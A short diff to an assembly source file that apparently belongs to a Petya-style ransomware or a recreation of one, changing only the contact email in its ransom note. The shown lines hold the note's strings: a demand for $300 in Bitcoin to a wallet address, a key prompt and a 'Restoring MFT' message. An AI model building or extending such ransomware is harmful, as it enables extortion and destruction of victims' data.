@@ -560,7 +560,7 @@ instructions_header: db 'Please follow the instructions:', 0
 instruction1:       db '1. Send $300 worth of Bitcoin to following address:', 0
 bitcoin_address:    db '1FAKE777xTuR2Rit7BmGSdzaAtNbHX999', 0
 instruction2_line1: db '2. Send your Bitcoin wallet ID and personal installation key to e-mail', 0
-instruction2_line2: db 'davaniko1122@@gmail.com. Your personal installation key:', 0
+instruction2_line2: db 'danko1122q@example.com. Your personal installation key:', 0
 key_prompt_line1:   db 'If you already purchased your key, please enter it below.', 0
 key_prompt_line2:   db 'Key: ', 0
 loading_text:       db 'Restoring MFT: [', 0
